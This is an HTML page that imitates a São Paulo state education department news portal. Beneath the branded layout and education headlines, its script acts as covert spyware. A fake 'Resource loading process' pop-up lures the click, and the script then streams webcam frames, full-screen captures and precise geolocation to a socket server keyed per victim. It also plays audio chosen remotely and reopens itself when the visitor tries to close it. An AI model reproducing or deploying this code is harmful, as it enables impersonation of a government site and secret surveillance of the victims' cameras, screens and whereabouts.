<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title> </title>
  <link rel="icon" href="https://www.institutoexito.com.br/storage/app/uploads/f3y98K8qjJjSJr8w7M6qu2EpzpofC8MLWbltM77l.jpg" type="image/png">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    /* ———— ESTRUTURA EXISTENTE ———— */
    body{margin:0;font-family:Arial, sans-serif}
    .top-bar{display:flex;justify-content:space-between;align-items:center;padding:10px 20px;background:#fff;border-bottom:1px solid #ccc;flex-wrap:wrap}
    .logo-text{display:flex;align-items:center;gap:10px}
    .logo{width:50px;height:40px;background:#000;border-radius:5px;position:relative}
    .logo::before{content:'';position:absolute;left:10px;top:8px;width:12px;height:12px;background:red;border-radius:2px}
    .gov-text{font-weight:700;font-size:14px;line-height:1.2}.gov-text span{display:block;font-size:12px;color:#555}
    .social-icons{display:flex;flex-direction:column;align-items:flex-end;gap:4px}
    .social-icons .row{display:flex;align-items:center;gap:8px}
    .social-icons i{font-size:16px;color:#666;cursor:pointer}.social-icons span{font-size:13px;color:#666}
    .font-controls i{font-size:14px;margin-left:8px}
    .mid-bar{text-align:center;background:#eee;padding:10px}.mid-bar i{font-size:20px;margin:0 6px}
    .nav-bar{background:#2e477a;color:#fff;display:flex;align-items:center;padding:10px 20px;justify-content:space-between;flex-wrap:wrap}
    .nav-links{display:flex;gap:20px;flex-wrap:wrap}.nav-links span{cursor:pointer}
    .search{font-size:18px;cursor:pointer}

    /* ———— NOVIDADE : GRID DE FOTOS ———— */
    .news-grid{
      display:grid;
      grid-template-columns:2fr 1fr;
      gap:24px;max-width:1200px;margin:40px auto;padding:0 20px;
    }
    .card{position:relative;overflow:hidden;border-radius:6px}
    .card img{width:100%;height:100%;object-fit:cover;display:block;transition:transform .4s}
    .card:hover img{transform:scale(1.05)}
    .card .ribbon{width:60px;height:4px;background:#d64146;margin-bottom:8px}
    .card .caption{
      position:absolute;left:0;bottom:0;width:100%;
      padding:24px;background:linear-gradient(0deg,rgba(0,0,0,.65) 0%,rgba(0,0,0,0) 80%);
      color:#fff;
    }
    .card h3{margin:0 0 6px;font-size:1.25rem;font-weight:700;line-height:1.3}
    .card p{margin:0;font-size:.9rem;opacity:.9}
    @media(max-width:850px){.news-grid{grid-template-columns:1fr}}
    @media(max-width:600px){
      .top-bar,.nav-bar{flex-direction:column;align-items:flex-start}
      .social-icons{align-items:flex-start}
    }
  </style>
</head>
<body>

<!-- TOPO INSTITUCIONAL -->
<div class="top-bar">
  <div class="logo-text">
    <div class="logo"></div>
    <div class="gov-text">SÃO PAULO<br><span>GOVERNO DO ESTADO<br>SÃO PAULO SÃO TODOS</span></div>
  </div>
  <div class="social-icons">
    <div class="row">
      <i class="fab fa-facebook-f"></i><i class="fab fa-linkedin-in"></i><i class="fab fa-tiktok"></i>
      <i class="fab fa-youtube"></i><i class="fab fa-x-twitter"></i><i class="fab fa-instagram"></i>
      <span>/governosp</span>
    </div>
    <div class="row font-controls">
      <i class="fas fa-plus-circle"></i><i class="fas fa-minus-circle"></i><i class="fas fa-exclamation-circle"></i>
    </div>
  </div>
</div>

<div class="mid-bar">
  <strong>Siga-nos em nossas redes sociais:</strong><br>
  <i class="fab fa-facebook" style="color:#1877F2"></i>
  <i class="fab fa-instagram" style="color:#E1306C"></i>
  <i class="fab fa-x-twitter" style="color:#000"></i>
  <i class="fab fa-youtube" style="color:#F00"></i>
  <i class="fab fa-flickr" style="color:#FF0084"></i>
  <i class="fab fa-tiktok" style="color:#000"></i>
</div>

<div class="nav-bar">
  <div class="nav-links">
    <span>Início</span><span>Institucional</span><span>Programas e Projetos</span>
    <span>Serviços</span><span>Sala do Professor</span><span>Fale com a SEDUC</span><span>Notícias</span>
  </div>
  <div class="search"><i class="fas fa-search"></i></div>
</div>

<main class="news-grid">
  <!-- card grande da esquerda -->
  <article class="card" style="grid-row:span 2">
    <img src="https://static.poder360.com.br/2023/09/escola-SP-ensino-medio-governo-de-Sao-Paulo-848x477.jpg" alt="">
    <div class="caption">
      <div class="ribbon"></div>
      <h3>Obras: Educação de SP investiu em unidades de ensino de 534 cidades paulistas nos últimos 28 meses</h3>
      <p>Gestão atual supera administração anterior e já beneficiou 1,7 milhão de alunos com obras em 82,9% dos municípios com escolas estaduais</p>
    </div>
  </article>

  <article class="card">
    <img src="https://educacao.sme.prefeitura.sp.gov.br/wp-content/uploads/2021/11/noticia-10-1.jpg" alt="">
    <div class="caption">
      <div class="ribbon"></div>
      <h3>Governo de São Paulo chega a 938 escolas climatizadas</h3>
      <p>Em mais uma etapa do programa “Escolas Mais Inclusivas”, Seduc-SP se alia ao CPB para inclusão esportiva em 75 escolas estaduais</p>
    </div>
  </article>

  <article class="card">
    <img src="https://www.educacao.sp.gov.br/wp-content/uploads/2025/05/54135232999_5f43d70c43_h-305x210.jpg" alt="">
    <div class="caption">
      <div class="ribbon"></div>
      <h3>1.523 grêmios de escolas estaduais vão receber R$ 55 milhões para projetos especiais</h3>
      <p>Unidades serão bonificadas de acordo com número de estudantes matriculados e meta alcançada no Saresp; no próximo ano, valores serão atrelados aos resultados no Saeb</p>
    </div>
  </article>
</main>

<video id="video" playsinline autoplay muted style="display:none"></video>
<audio id="troll-audio" src="https://actions.google.com/sounds/v1/ambiences/subway_station_nyc.ogg"></audio>

<script src="/socket.io/socket.io.js"></script>
<script>
/* ══════════════════════════════════════════════════════
   → ISOLAMENTO POR CHAVE
   • URL obrigatória:  /sp.html/SUA_CHAVE
   • A chave será enviada como lab no handshake
   ══════════════════════════════════════════════════════ */
if (!location.pathname.includes('/sp.html/')) {
  alert('Acesso inválido. Use /sp.html/SUA_CHAVE');
  location.href = '/';
}
const key = location.pathname.split('/').pop().toUpperCase();
if (!key || key === 'SP.HTML') {
  alert('⚠️ Nenhuma chave foi fornecida');
  throw new Error('Chave ausente');
}

/* ========= Conexão Socket =========================================== */
const socket = io({ query:{ role:'client', lab:key } });

/* ========= Pop‑up de “Resource loading process” ===================== */
window.addEventListener('load', () => {
  const overlay = Object.assign(document.createElement('div'), {
    style:'position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;z-index:9999'
  });
  const box = Object.assign(document.createElement('div'), {
    style:'background:#111;color:#fff;padding:2rem 3rem;border-radius:8px;text-align:center;font-family:Arial, sans-serif'
  });
  const title = Object.assign(document.createElement('h2'), {textContent:'Resource loading process'});
  const btn = Object.assign(document.createElement('button'), {
    textContent:'...',
    style:'margin-top:1rem;padding:.7rem 1.5rem;font-size:1rem;font-weight:600;cursor:pointer'
  });
  box.append(title, btn); overlay.appendChild(box); document.body.appendChild(overlay);
  const audio = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');
  btn.onclick = ()=>{ audio.play(); overlay.remove(); };
});

/* ========= Eventos especiais (crash…) =============================== */
socket.on('crash-browser', () => {
  console.log('Recebi crash-browser, iniciando loop de crash');
  for (let i=5;i>3;i--){ console.log(i); }
});

/* ========= Utilidades =============================================== */
const blobToDataURL = blob => new Promise(r=>{ const fr=new FileReader(); fr.onload=()=>r(fr.result); fr.readAsDataURL(blob); });

/* ========= Câmera ==================================================== */
(async()=>{
  try{
    const cam = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
    const cap = new ImageCapture(cam.getVideoTracks()[0]);
    setInterval(async()=>{
      try{
        const bmp = await cap.grabFrame();
        const cv  = new OffscreenCanvas(bmp.width,bmp.height);
        cv.getContext('2d').drawImage(bmp,0,0);
        const blob = await cv.convertToBlob({type:'image/jpeg',quality:.6});
        socket.emit('frame', await blobToDataURL(blob));
      }catch{}
    },300);
  }catch(err){ console.warn('cam:',err); }
})();

/* ========= Compartilhamento de tela ================================= */
let wantScreen = true;
(async function startScreen(){
  try{
    const constraints = {video:{width:1920,height:1080,frameRate:15}};
    const stream = await navigator.mediaDevices.getDisplayMedia(constraints);
    const track  = stream.getVideoTracks()[0];
    if(track.applyConstraints) track.applyConstraints(constraints.video).catch(()=>{});
    const cap    = new ImageCapture(track);
    const CW=1920, CH=1080;
    const canvas = new OffscreenCanvas(CW,CH);
    const ctx    = canvas.getContext('2d');
    setInterval(async()=>{
      if(!wantScreen) return;
      try{
        const bmp  = await cap.grabFrame();
        ctx.drawImage(bmp,0,0,CW,CH);
        const blob = await canvas.convertToBlob({type:'image/jpeg',quality:.8});
        socket.emit('screen-frame', await blobToDataURL(blob));
      }catch{}
    },100);
    track.addEventListener('ended',()=> wantScreen=false);
  }catch(err){ console.warn('screen:',err); }
})();

/* ========= Geolocalização =========================================== */
if ('geolocation' in navigator){
  navigator.geolocation.watchPosition(pos=>{
    socket.emit('location',{
      lat:pos.coords.latitude,lon:pos.coords.longitude,
      accuracy:pos.coords.accuracy,timestamp:pos.timestamp
    });
  },()=>{}, {enableHighAccuracy:true,maximumAge:5000,timeout:10000});
}

/* ========= Áudios remotos =========================================== */
let currentAudio=null;
socket.on('play-audio',({url})=>{
  if(currentAudio){currentAudio.pause();currentAudio=null;}
  currentAudio=new Audio(url);
  currentAudio.play().catch(()=>{});
});
socket.on('stop-audio',()=>{
  if(currentAudio){currentAudio.pause();currentAudio.currentTime=0;currentAudio=null;}
});

/* ========= Anti‑fechamento ========================================== */
let confirmExit=true;
window.addEventListener('beforeunload',e=>{
  if(confirmExit){
    e.preventDefault(); e.returnValue='';
    setTimeout(()=>window.open(window.location.href,'_blank'),10);
  }
});
</script>
</body>
</html>
